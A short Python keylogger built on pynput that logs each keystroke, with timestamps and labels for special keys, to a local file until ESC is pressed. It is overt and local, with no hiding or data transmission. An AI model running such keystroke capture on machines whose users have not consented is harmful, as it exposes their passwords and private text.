from pynput import keyboard
import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = str(key).replace("'", "")
        if key == keyboard.Key.space:
            key_str = " [SPACE] "
        elif key == keyboard.Key.enter:
            key_str = " [ENTER] "
        elif key == keyboard.Key.tab:
            key_str = " [TAB] "
        elif key == keyboard.Key.backspace:
            key_str = " [BACKSPACE] "
        elif key == keyboard.Key.esc:
            with open(LOG_FILE, "a") as f:
                f.write(f"{timestamp}: [ESC] - Logging stopped\n")
            return False
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp}: {key_str}\n")
    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp}: ERROR - {str(e)}\n")

def main():
    with open(LOG_FILE, "a") as f:
        f.write(f"\n--- Keylogger started at {datetime.datetime.now()} ---\n")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
